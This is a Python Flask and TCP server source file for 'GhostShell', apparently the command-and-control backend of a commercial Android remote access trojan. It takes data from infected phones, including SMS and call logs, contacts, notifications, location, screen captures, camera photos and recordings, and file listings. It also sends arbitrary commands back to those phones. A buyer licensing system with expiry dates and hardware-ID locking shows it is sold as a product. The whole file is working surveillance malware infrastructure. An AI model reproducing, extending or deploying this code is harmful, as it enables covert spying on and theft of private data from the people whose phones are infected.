import socket
import json
import threading
import base64
import os
import time
import sqlite3
from datetime import datetime, timedelta
from flask import Flask, request, jsonify, render_template, send_from_directory, redirect, url_for, session
from werkzeug.utils import secure_filename

app = Flask(__name__)
app.secret_key = 'GHOSTSHELL_SECRET_KEY_999' # Buat session flask

clients = {}
server_logs = []
file_transfers = {}
lock = threading.Lock()

DB_PATH = 'ghostshell.db'

# --- DATABASE LOGIC ---
def get_db():
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    return conn

def init_db():
    conn = get_db()
    conn.execute('''
        CREATE TABLE IF NOT EXISTS buyers (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            uid TEXT UNIQUE NOT NULL,
            locked_hwid TEXT DEFAULT NULL,
            expiry_date TIMESTAMP NOT NULL,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    ''')
    conn.commit()
    conn.close()
    print("[GHOSTSHELL] > Database SQLite Active.")

# Folder initialization
DIRS = ['captured_images', 'device_downloads', 'screen_recordings']
for d in DIRS:
    if not os.path.exists(d): os.makedirs(d)

def add_log(msg):
    t = time.strftime("%H:%M:%S")
    formatted = f"[{t}] {msg}"
    print(formatted)
    server_logs.insert(0, formatted)
    if len(server_logs) > 100: server_logs.pop()

def create_client_data():
    return {
        "sms": [], "calls": [], "apps": [], "notifications": [], "contacts": [],
        "fm": {"path": "/", "files": []}, "gallery": {"page": 0, "files": []},
        "info": {}, "location": {"url": None, "img": None, "status": "idle"},
        "media": {"last_img": None, "last_vid": None, "status": "idle"},
        "msgs": [], "screen": None
    }

def handle_tcp_data(raw_line, cid):
    try:
        packet = json.loads(raw_line).get('data', {})
        t = packet.get('type')
        with lock:
            if cid not in clients: return
            cd = clients[cid]['data']
            
            if t == 'DEVICE_INFO': cd['info'].update(packet.get('info', {}))
            elif t == 'SCREEN_FRAME': cd['screen'] = packet.get('frame')
            elif t == 'SMS_LOG': cd['sms'] = packet.get('logs', [])
            elif t == 'CALL_LOG': cd['calls'] = packet.get('logs', [])
            elif t == 'CONTACT_LIST': cd['contacts'] = packet.get('contacts', [])
            elif t == 'APP_LIST': cd['apps'] = packet.get('apps', [])
            elif t == 'NOTIFICATION_DATA': cd['notifications'].insert(0, packet.get('notification', {}))
            elif t == 'FILE_MANAGER_RESULT': cd['fm'].update(packet.get('listing', {}))
            elif t == 'LOCATION_SUCCESS': 
                loc = packet.get('data', {}) if isinstance(packet.get('data'), dict) else {"url": packet.get('url')}
                cd['location'].update({"url": loc.get('url'), "img": loc.get('image_url'), "status": "success"})
            elif t == 'LOCATION_PENDING': cd['location']['status'] = "waiting"
            elif t == 'RECORD_STATUS': cd['media']['status'] = packet.get('status')
            elif t == 'GALLERY_PAGE_DATA': cd['gallery'].update(packet.get('data', packet))
            elif t == 'WALLPAPER_STATUS': cd['msgs'].insert(0, packet.get('status'))
            elif 'CHUNK' in t:
                chunk = packet.get('chunk_data', {})
                fname = chunk.get('filename')
                if fname: 
                    file_transfers.setdefault(fname, []).append(chunk.get('chunk'))
                    if len(file_transfers[fname]) % 10 == 0:
                        add_log(f"Receiving {t}: {fname} (Chunk {len(file_transfers[fname])})")
            elif 'END' in t:
                fname = packet.get('file')
                if fname and fname in file_transfers:
                    b64_data = "".join(file_transfers.pop(fname))
                    if fname.endswith('.mp4'):
                         folder = 'captured_images'
                         path = os.path.join(folder, secure_filename(fname))
                         with open(path, 'wb') as f: f.write(base64.b64decode(b64_data))
                         cd['media'].update({"last_vid": fname, "status": "done"})
                    elif t == 'CAMERA_IMAGE_END' or fname.startswith(('back_pic','front_pic')):
                        cd['media'].update({"last_img": b64_data, "is_direct": True, "status": "done"})
                    else:
                        cd['media']['last_img'] = fname
                    add_log(f"Data Received (Memory Mode): {fname}")
            add_log(f"Received {t} from {cid}")
    except Exception as e: add_log(f"Error parsing: {e}")

def client_handler(conn, addr):
    cid = f"{addr[0]}:{addr[1]}"
    with lock: clients[cid] = {'socket': conn, 'data': create_client_data()}
    add_log(f"Client Connected: {cid}")
    buffer = ""
    try:
        while True:
            chunk = conn.recv(16384).decode('utf-8', errors='ignore')
            if not chunk: break
            buffer += chunk
            while '\n' in buffer:
                line, buffer = buffer.split('\n', 1)
                if line.strip(): handle_tcp_data(line.strip(), cid)
    except: pass
    finally:
        with lock: 
            if cid in clients: del clients[cid]
        add_log(f"Client Disconnected: {cid}")
        conn.close()

def tcp_server():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(('0.0.0.0', 8888))
    s.listen(20)
    add_log("TCP Engine Active on Port 8888")
    while True:
        c, a = s.accept()
        threading.Thread(target=client_handler, args=(c, a), daemon=True).start()

# --- ROUTES ---

@app.route('/')
def index(): return render_template('index.html')

@app.route('/dashboard')
def dashboard(): return render_template('dashboard.html')

@app.route('/admin')
def admin_login_page():
    if session.get('is_admin'): return redirect(url_for('admin_dashboard'))
    return render_template('admin.html', view='login')

@app.route('/admin/dashboard')
def admin_dashboard():
    if not session.get('is_admin'): return redirect(url_for('admin_login_page'))
    conn = get_db()
    users = conn.execute('SELECT * FROM buyers ORDER BY created_at DESC').fetchall()
    conn.close()
    return render_template('admin.html', view='dashboard', users=users)

# --- BUYER API ---

@app.route('/api/buyer/login', methods=['POST'])
def buyer_login():
    data = request.json
    uid = data.get('uid')
    hwid = data.get('hwid')
    
    if not uid or not hwid: return jsonify({"status": "error", "message": "UID & HWID REQUIRED"}), 400
    
    conn = get_db()
    user = conn.execute('SELECT * FROM buyers WHERE uid = ?', (uid,)).fetchone()
    
    if not user:
        conn.close()
        return jsonify({"status": "error", "message": "UID NOT REGISTERED"}), 401
    
    # Check Expiry
    expiry = datetime.strptime(user['expiry_date'], '%Y-%m-%d %H:%M:%S')
    if expiry < datetime.now():
        conn.close()
        return jsonify({"status": "error", "message": "ACCOUNT EXPIRED"}), 403
    
    # Check HWID
    if user['locked_hwid'] is None:
        # First login binding
        conn.execute('UPDATE buyers SET locked_hwid = ? WHERE uid = ?', (hwid, uid))
        conn.commit()
    elif user['locked_hwid'] != hwid:
        conn.close()
        return jsonify({"status": "error", "message": "LOCKED TO ANOTHER DEVICE"}), 403
    
    conn.close()
    return jsonify({"status": "ok"})

# --- ADMIN API ---

@app.route('/api/admin/login', methods=['POST'])
def admin_login():
    data = request.json
    if data.get('u') == 'ghostshell' and data.get('p') == 'ghostshell10':
        session['is_admin'] = True
        return jsonify({"status": "ok"})
    return jsonify({"status": "fail"}), 401

@app.route('/api/admin/logout')
def admin_logout():
    session.pop('is_admin', None)
    return redirect(url_for('admin_login_page'))

@app.route('/api/admin/create_user', methods=['POST'])
def create_user():
    if not session.get('is_admin'): return jsonify({"status": "fail"}), 403
    data = request.json
    uid = data.get('uid')
    days = int(data.get('days', 30))
    expiry = (datetime.now() + timedelta(days=days)).strftime('%Y-%m-%d %H:%M:%S')
    
    try:
        conn = get_db()
        conn.execute('INSERT INTO buyers (uid, expiry_date) VALUES (?, ?)', (uid, expiry))
        conn.commit()
        conn.close()
        return jsonify({"status": "ok"})
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 400

@app.route('/api/admin/reset_hwid', methods=['POST'])
def reset_hwid():
    if not session.get('is_admin'): return jsonify({"status": "fail"}), 403
    uid = request.json.get('uid')
    conn = get_db()
    conn.execute('UPDATE buyers SET locked_hwid = NULL WHERE uid = ?', (uid,))
    conn.commit()
    conn.close()
    return jsonify({"status": "ok"})

@app.route('/api/admin/delete_user', methods=['POST'])
def delete_user():
    if not session.get('is_admin'): return jsonify({"status": "fail"}), 403
    uid = request.json.get('uid')
    conn = get_db()
    conn.execute('DELETE FROM buyers WHERE uid = ?', (uid,))
    conn.commit()
    conn.close()
    return jsonify({"status": "ok"})

@app.route('/api/status')
def get_status():
    owner_filter = request.args.get('owner')
    with lock:
        devs = []
        for k, v in clients.items():
            info = v['data']['info']
            if owner_filter and info.get('Owner') != owner_filter: continue
            devs.append({
                'id': k, 'model': info.get('Model', '?'), 'man': info.get('Manufacturer', '?'),
                'ver': info.get('AndroidVersion', '?'), 'cnt': info.get('Country', 'Unknown'),
                'bat': info.get('Battery', '?')
            })
    return jsonify({"logs": server_logs, "devices": devs})

@app.route('/api/data/<cid>')
def get_data(cid):
    with lock: return jsonify(clients[cid]['data'] if cid in clients else {"error": 404})

@app.route('/api/command', methods=['POST'])
def send_cmd():
    r = request.json
    cid, cmd = r.get('client_id'), r.get('cmd')
    with lock:
        if cid in clients:
            try:
                clients[cid]['socket'].sendall(f"{cmd}\n".encode())
                add_log(f"Command Sent to {cid}: {cmd}")
                return jsonify({"status": "ok"})
            except: return jsonify({"status": "fail"}), 500
    return jsonify({"status": "not_found"}), 404

@app.route('/captured_images/<path:f>')
def serve_img(f): return send_from_directory('captured_images', f)

if __name__ == '__main__':
    init_db()
    threading.Thread(target=tcp_server, daemon=True).start()
    app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 8080)))
